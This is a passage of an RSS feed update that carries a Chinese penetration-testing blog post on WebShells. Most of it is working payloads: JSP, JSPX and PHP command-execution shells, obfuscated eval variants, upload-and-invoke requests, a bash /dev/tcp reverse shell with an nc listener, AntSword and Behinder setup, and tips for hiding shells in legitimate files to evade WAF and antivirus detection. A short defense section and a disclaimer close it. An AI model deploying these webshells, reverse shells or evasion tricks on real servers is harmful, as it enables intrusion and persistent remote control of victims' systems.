+&lt;li&gt;使用 Base64 编码参数：&lt;figure class=&#34;highlight jsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsp&#34;&gt;&amp;lt;% Runtime.getRuntime().exec(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt;(Base64.getDecoder().decode(request.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt;)))); %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;反弹 Shell：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;你的IP&amp;gt;/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-JSPX-WebShell&#34;&gt;&lt;a href=&#34;#5-JSPX-WebShell&#34; class=&#34;headerlink&#34; title=&#34;5. JSPX WebShell&#34;&gt;&lt;/a&gt;5. JSPX WebShell&lt;/h3&gt;&lt;h4 id=&#34;示例代码-4&#34;&gt;&lt;a href=&#34;#示例代码-4&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs jspx&#34;&gt;&amp;lt;jsp:root xmlns:jsp=&amp;quot;http://java.sun.com/JSP/Page&amp;quot; version=&amp;quot;2.0&amp;quot;&amp;gt;&lt;br&gt;  &amp;lt;jsp:scriptlet&amp;gt;&lt;br&gt;    Runtime.getRuntime().exec(request.getParameter(&amp;quot;i&amp;quot;));&lt;br&gt;  &amp;lt;/jsp:scriptlet&amp;gt;&lt;br&gt;&amp;lt;/jsp:root&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;调用方式-4&#34;&gt;&lt;a href=&#34;#调用方式-4&#34; class=&#34;headerlink&#34; title=&#34;调用方式&#34;&gt;&lt;/a&gt;调用方式&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;保存为 &lt;code&gt;shell.jspx&lt;/code&gt;，上传至目标服务器。&lt;/li&gt;
+&lt;li&gt;请求示例：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;http://target.com/shell.jspx?i=&lt;span class=&#34;hljs-built_in&#34;&gt;whoami&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：&lt;code&gt;i&lt;/code&gt; 为系统命令。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;特点-4&#34;&gt;&lt;a href=&#34;#特点-4&#34; class=&#34;headerlink&#34; title=&#34;特点&#34;&gt;&lt;/a&gt;特点&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;回显&lt;/strong&gt;：无（需配合反弹 Shell）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优缺点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;XML 格式，兼容 JSP 环境。&lt;/li&gt;
+&lt;li&gt;需正确闭合标签，避免解析错误。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;绕过建议-4&#34;&gt;&lt;a href=&#34;#绕过建议-4&#34; class=&#34;headerlink&#34; title=&#34;绕过建议&#34;&gt;&lt;/a&gt;绕过建议&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;与 JSP 类似，使用 Base64 或加密参数。&lt;/li&gt;
+&lt;li&gt;确保 JSPX 格式符合 XML 标准。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-蚁剑专用-WebShell&#34;&gt;&lt;a href=&#34;#6-蚁剑专用-WebShell&#34; class=&#34;headerlink&#34; title=&#34;6. 蚁剑专用 WebShell&#34;&gt;&lt;/a&gt;6. 蚁剑专用 WebShell&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;推荐项目&lt;/strong&gt;：JSP 专用蚁剑马（&lt;a href=&#34;https://github.com/yzddmr6/JspForAntSword&#34;&gt;GitHub: JspForAntSword&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;兼容蚁剑管理界面&lt;/li&gt;
+&lt;li&gt;隐蔽性强，支持部分回显&lt;/li&gt;
+&lt;li&gt;提供文件管理、命令执行等功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用方法&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;下载项目中的 JSP WebShell。&lt;/li&gt;
+&lt;li&gt;上传至目标服务器，配置蚁剑：&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://target.com/shell.jsp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：自定义（如 &lt;code&gt;cmd&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：JSP&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认或 Base64&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、WebShell-绕过技巧&#34;&gt;&lt;a href=&#34;#四、WebShell-绕过技巧&#34; class=&#34;headerlink&#34; title=&#34;四、WebShell 绕过技巧&#34;&gt;&lt;/a&gt;四、WebShell 绕过技巧&lt;/h2&gt;&lt;h3 id=&#34;1-混淆与加密&#34;&gt;&lt;a href=&#34;#1-混淆与加密&#34; class=&#34;headerlink&#34; title=&#34;1. 混淆与加密&#34;&gt;&lt;/a&gt;1. 混淆与加密&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Base64 编码&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+客户端发送 Base64 编码的命令：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl http://target.com/shell.php -d &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd=c3lzdGVtKCd3aG9hbWknKTs=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分割关键词&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ev&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;al&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$f&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;自定义函数&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;x&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;); &amp;#125; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;x&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-反弹-Shell&#34;&gt;&lt;a href=&#34;#2-反弹-Shell&#34; class=&#34;headerlink&#34; title=&#34;2. 反弹 Shell&#34;&gt;&lt;/a&gt;2. 反弹 Shell&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;在 Kali 上启动监听：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;WebShell 执行反弹命令：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;你的IP&amp;gt;/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;适用于无回显场景（如 JSP&amp;#x2F;JSPX）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-配合工具-1&#34;&gt;&lt;a href=&#34;#3-配合工具-1&#34; class=&#34;headerlink&#34; title=&#34;3. 配合工具&#34;&gt;&lt;/a&gt;3. 配合工具&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;蚁剑&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;配置 WebShell URL 和密码，自动处理命令执行和文件管理。&lt;/li&gt;
+&lt;li&gt;支持加密传输（如 Base64、AES）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;冰蝎&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;使用加密 WebShell（如 PHP 冰蝎马）。&lt;/li&gt;
+&lt;li&gt;提供高隐蔽性，绕过 WAF 和杀软。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-文件名伪装&#34;&gt;&lt;a href=&#34;#4-文件名伪装&#34; class=&#34;headerlink&#34; title=&#34;4. 文件名伪装&#34;&gt;&lt;/a&gt;4. 文件名伪装&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;使用非典型文件名：&lt;code&gt;info.php&lt;/code&gt;、&lt;code&gt;config.php&lt;/code&gt; 等。&lt;/li&gt;
+&lt;li&gt;嵌入正常页面：将 WebShell 代码隐藏在合法 PHP 文件中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、防护建议&#34;&gt;&lt;a href=&#34;#五、防护建议&#34; class=&#34;headerlink&#34; title=&#34;五、防护建议&#34;&gt;&lt;/a&gt;五、防护建议&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;文件上传校验&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;严格验证上传文件的类型和内容。&lt;/li&gt;
+&lt;li&gt;使用白名单限制文件扩展名（如只允许 &lt;code&gt;.jpg&lt;/code&gt;、&lt;code&gt;.png&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;对上传文件进行重命名，避免直接执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中禁用高危函数：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = eval,assert,exec,system,passthru,shell_exec,proc_open&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;ASP&amp;#x2F;ASPX 限制 &lt;code&gt;eval&lt;/code&gt; 和 &lt;code&gt;execute&lt;/code&gt; 使用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;权限控制&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;配置 Web 服务器以最低权限运行（如非 root&amp;#x2F;SYSTEM）。&lt;/li&gt;
+&lt;li&gt;限制脚本对文件系统和命令的访问。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;WAF 部署&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;配置 Web 应用防火墙，检测 &lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt; 等关键词。&lt;/li&gt;
+&lt;li&gt;拦截异常参数（如 Base64 编码的命令）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;日志监控&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;监控 Web 服务器日志，关注异常请求（如 &lt;code&gt;?cmd=&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;定期扫描服务器，检测可疑文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;定期审计&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;检查 Web 目录，删除未知脚本文件。&lt;/li&gt;
+&lt;li&gt;更新系统和框架，修复已知漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、总结表格&#34;&gt;&lt;a href=&#34;#六、总结表格&#34; class=&#34;headerlink&#34; title=&#34;六、总结表格&#34;&gt;&lt;/a&gt;六、总结表格&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;类型&lt;/th&gt;
+&lt;th&gt;推荐语法&lt;/th&gt;
+&lt;th&gt;回显&lt;/th&gt;
+&lt;th&gt;备注&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;ASP&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% execute request(&amp;quot;cmd&amp;quot;) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无&lt;/td&gt;
+&lt;td&gt;经典语法，易被查杀&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;ASPX&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;eval(Request[&amp;quot;1&amp;quot;], &amp;quot;unsafe&amp;quot;)&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无&lt;/td&gt;
+&lt;td&gt;需开启 unsafe 模式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;eval($_REQUEST[&amp;#39;1&amp;#39;])&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;有&lt;/td&gt;
+&lt;td&gt;最实用，需权限，建议混淆&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;JSP&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;Runtime.getRuntime().exec(...)&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无&lt;/td&gt;
+&lt;td&gt;默认无回显，配合反弹 Shell&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;JSPX&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;jsp:scriptlet&amp;gt;exec(...)&amp;lt;/jsp:scriptlet&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;无&lt;/td&gt;
+&lt;td&gt;JSPX 需正确 XML 格式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、总结&#34;&gt;&lt;a href=&#34;#七、总结&#34; class=&#34;headerlink&#34; title=&#34;七、总结&#34;&gt;&lt;/a&gt;七、总结&lt;/h2&gt;&lt;p&gt;WebShell 是渗透测试中的利器，ASP、ASPX、PHP、JSP 和 JSPX 各有特点，PHP WebShell 因其回显和兼容性最为常用。配合蚁剑、冰蝎等工具，可实现命令执行、文件管理甚至反弹 Shell。实际利用中，需通过混淆、加密和伪装绕过 WAF 和杀软检测。开发者应加强文件上传校验、禁用危险函数、部署 WAF 和监控日志，防范 WebShell 攻击。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供合法授权的渗透测试和安全研究，严禁用于非法用途！&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
